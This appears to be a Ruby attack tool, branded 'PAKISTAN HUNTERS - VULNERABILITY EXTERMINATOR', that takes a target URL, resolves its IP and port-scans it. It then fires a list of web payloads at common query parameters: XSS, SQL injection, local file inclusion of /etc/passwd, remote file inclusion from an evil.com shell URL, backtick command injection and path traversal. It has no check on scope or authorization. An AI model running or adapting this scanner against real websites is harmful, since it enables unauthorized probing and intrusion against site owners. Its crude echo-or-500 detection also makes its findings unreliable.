require 'resolv'
require 'net/http'
require 'socket'
require 'uri'
require 'timeout'

def clear
  system("clear") || system("cls")
end

def ascii
  puts <<~ART
    \e[31m
    ██████╗  █████╗ ██╗  ██╗██╗███████╗████████╗ █████╗ ███╗   ██╗
    ██╔══██╗██╔══██╗██║ ██╔╝██║██╔════╝╚══██╔══╝██╔══██╗████╗  ██║
    ██████╔╝███████║█████╔╝ ██║███████╗   ██║   ███████║██╔██╗ ██║
    ██╔═══╝ ██╔══██║██╔═██╗ ██║╚════██║   ██║   ██╔══██║██║╚██╗██║
    ██║     ██║  ██║██║  ██╗██║███████║   ██║   ██║  ██║██║ ╚████║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
    \e[33m     PAKISTAN HUNTERS - VULNERABILITY EXTERMINATOR\e[0m
  ART
end

def cor(txt, cor)
  cores = {
    vermelho: "\e[31m", verde: "\e[32m", amarelo: "\e[33m",
    azul: "\e[34m", magenta: "\e[35m", ciano: "\e[36m", reset: "\e[0m"
  }
  "#{cores[cor]}#{txt}#{cores[:reset]}"
end

def ip_real(url)
  host = URI.parse(url).host
  Resolv.getaddress(host)
rescue
  "erro"
end

def portas_abertas(ip, portas = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306])
  puts cor("\n[+] PORTAS ABERTAS:", :magenta)
  portas.each do |porta|
    begin
      Timeout.timeout(0.5) do
        socket = TCPSocket.new(ip, porta)
        puts cor("[+] Porta #{porta} aberta", :verde)
        socket.close
      end
    rescue
    end
  end
end

def headers_info(url)
  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == "https")
  res = http.get(uri.path.empty? ? "/" : uri.path)

  puts cor("\n[+] HEADERS HTTP:", :magenta)
  res.each_header do |key, value|
    puts cor("[#{key}] => #{value}", :ciano)
  end
end

def info_site(url)
  puts cor("\n[+] INFOS DO SITE:", :magenta)
  host = URI.parse(url).host
  ip = ip_real(url)
  puts cor("[+] Dominio: #{host}", :azul)
  puts cor("[+] IP real: #{ip}", :azul)

  portas_abertas(ip)
  headers_info(url)
end

def testar_vuln(url, param, payload, tipo)
  begin
    uri = URI(url)
    query = URI.decode_www_form(uri.query || "") << [param, payload]
    uri.query = URI.encode_www_form(query)

    res = Net::HTTP.get_response(uri)
    if res.body.include?(payload) || res.code.to_i == 500
      puts cor("[!] Vulnerável a #{tipo} => #{uri}", :vermelho)
    end
  rescue
    puts cor("[-] erro testando #{tipo}", :amarelo)
  end
end

def scanner_falhas(base_url)
  puts cor("\n[+] SCAN DE FALHAS:", :magenta)
  test_params = ["q", "search", "id", "file", "page", "url", "redirect"]

  payloads = {
    "XSS" => "<script>alert(1337)</script>",
    "SQLi" => "' OR '1'='1",
    "LFI" => "../../../../../etc/passwd",
    "RFI" => "http://evil.com/shell.txt",
    "CMDi" => "`ls`",
    "Redirect" => "https://evil.com",
    "Path Traversal" => "../../../../../../windows/win.ini"
  }

  test_params.each do |param|
    payloads.each do |tipo, payload|
      testar_vuln("#{base_url}?#{param}=test", param, payload, tipo)
    end
  end
end

# main
clear
ascii
print cor("url base (ex: http://site.com/index.php): ", :ciano)
url = gets.chomp

info_site(url)
scanner_falhas(url)
